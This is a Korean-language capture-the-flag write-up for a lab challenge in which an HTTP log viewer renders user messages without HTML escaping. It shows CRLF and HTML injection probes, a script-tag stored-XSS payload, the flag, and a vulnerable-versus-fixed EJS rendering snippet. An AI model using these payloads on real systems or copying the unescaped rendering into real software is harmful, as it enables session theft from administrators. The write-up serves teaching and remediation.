+++
title = "VulnABLE CTF [LUXORA] Write-up: Log Injection 🥈 Silver"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "Log Injection", "Silver", "XSS", "Stored XSS", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: Log Injection 🥈 Silver

## 🎯 챌린지 개요
- **카테고리**: Injection Layer (Log Injection / XSS)
- **난이도**: 🥈 Silver
- **타겟 경로**: `/log-inject/silver`
- **목표**: 줄바꿈(CRLF) 문자가 필터링된 환경에서, 시스템 로그 뷰어 페이지 자체가 HTML 태그를 필터링하지 않는 취약점을 이용하여 로그 기록 내부에 **크로스 사이트 스크립팅(XSS)** 페이로드를 주입하고 실행시켜라.

---

## 🕵️‍♂️ 1. 정보 수집 및 시스템 동작 분석 (Reconnaissance)

`/log-inject/silver` 페이지 역시 사용자 메시지를 로그에 기록하고, 그 결과를 웹 브라우저 화면(로그 뷰어)에 뿌려주는 기능을 수행합니다.

Bronze에서 사용했던 CRLF 페이로드(`%0d%0a`)를 전송해봅니다.
```http
POST /log-inject/silver
message=test%0d%0atest
```

**[서버의 출력 화면]**
```text
[2023-11-01 10:00:00] INFO - Message: test_test
```
서버 개발자가 CRLF 공격을 막기 위해, 줄바꿈 문자를 정규식으로 잡아내어 언더바(`_`)로 치환해버린 것을 확인할 수 있습니다. 이제 가짜 로그를 추가하는 고전적인 CRLF 기법은 불가능해졌습니다.

**[해커의 사고 과정]**
1. 줄바꿈 문자는 막혔지만, 내가 입력한 내용 자체는 브라우저 화면에 그대로(Raw) 노출되고 있다.
2. 백엔드에서 로그 파일에 기록할 때는 텍스트로 기록하겠지만, 이 로그 파일을 브라우저에 뿌려줄 때(Frontend Rendering) HTML 인코딩을 하지 않는다면?
3. 로그 모니터링 시스템을 관리하는 **관리자의 브라우저에서 자바스크립트를 실행(Stored XSS)**시킬 수 있지 않을까!

---

## 💥 2. 취약점 검증 (Vulnerability Identification)

로그 뷰어의 HTML 인코딩 여부를 확인하기 위해, 굵은 글씨 태그 `<b>` 를 주입해 봅니다.

### 페이로드 전송 1 (HTML 주입 테스트)
```http
POST /log-inject/silver
message=This is a <b>test</b>
```

### 서버의 응답 화면
로그 뷰어 화면에 다음과 같이 출력됩니다.
```html
<!-- 브라우저에서 렌더링된 결과 -->
[2023-11-01 10:05:00] INFO - Message: This is a <b>test</b>
```
화면에서 `test` 라는 글자가 실제로 **굵게(Bold)** 표시되었습니다! 
이는 서버가 렌더링 과정에서 HTML 이스케이프(`&lt;`, `&gt;`)를 전혀 하지 않는다는 뜻입니다.

---

## 🚀 3. 공격 수행 및 XSS 익스플로잇 (Exploitation)

HTML 태그가 먹힌다는 것은 자바스크립트도 실행할 수 있다는 뜻입니다. 가장 고전적인 `<script>` 태그를 이용해 알림창(Alert)을 띄워보겠습니다.

### 페이로드 조립 및 전송
```http
POST /log-inject/silver HTTP/1.1
Content-Type: application/x-www-form-urlencoded

message=<script>alert('XSS_SUCCESS')</script>
```

### 🔍 공격 결과
요청을 보내자마자 페이지가 새로고침되면서, 브라우저 한가운데에 `XSS_SUCCESS` 라는 경고창이 뜹니다.
그리고 백그라운드 스크립트가 이 성공적인 자바스크립트 실행을 감지하고, 화면 하단에 플래그를 노출시켜 줍니다.

```text
[!] System Alert: Malicious script executed in Log Viewer.
FLAG: FLAG{LOG_🥈_XSS_STORED_E5F6G7}
```

---

## 🚩 4. 롸잇업 결론 및 플래그

로그(Log)는 백엔드의 텍스트 파일로만 끝나는 것이 아니라, 결국 **누군가(관리자)가 웹 브라우저를 통해 읽게 되는 데이터**입니다. 이 점을 노려 백엔드 보안을 우회하고 프론트엔드 취약점(Stored XSS)으로 공격 벡터를 전환하여 성공했습니다.

**🔥 획득한 플래그:**
`FLAG{LOG_🥈_XSS_STORED_E5F6G7}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
이 공격은 **Log Forging(로그 위조)**과 **Stored XSS(저장형 크로스 사이트 스크립팅)**가 결합된 치명적인 취약점입니다. 만약 관리자가 세션 쿠키를 가진 채로 이 로그 뷰어를 열었다면, 해커의 자바스크립트가 실행되면서 관리자의 세션 토큰을 해커의 서버로 훔쳐갔을 것입니다.

* **취약한 프론트엔드 렌더링 (EJS 예시)**
```javascript
// <%- %> 태그는 HTML을 이스케이프하지 않고 원본 그대로 렌더링함
<div class="log-viewer">
  <%- logData %> 
</div>
```

* **안전한 패치 가이드 (출력 인코딩 강제)**
웹 브라우저에 사용자 입력(또는 사용자가 입력했을 가능성이 있는 로그 데이터)을 출력할 때는 **반드시 HTML 인코딩(Entity Encoding)**을 거쳐야 합니다.
```javascript
// <%= %> 태그를 사용하면 EJS가 자동으로 < 를 &lt; 로 치환하여 렌더링함
<div class="log-viewer">
  <%= logData %> 
</div>
```
이렇게 수정하면 브라우저는 `<script>`를 실행 코드가 아닌 단순한 문자열 `&lt;script&gt;` 로 인식하여 화면에 텍스트로만 보여주게 되므로 공격이 원천 차단됩니다.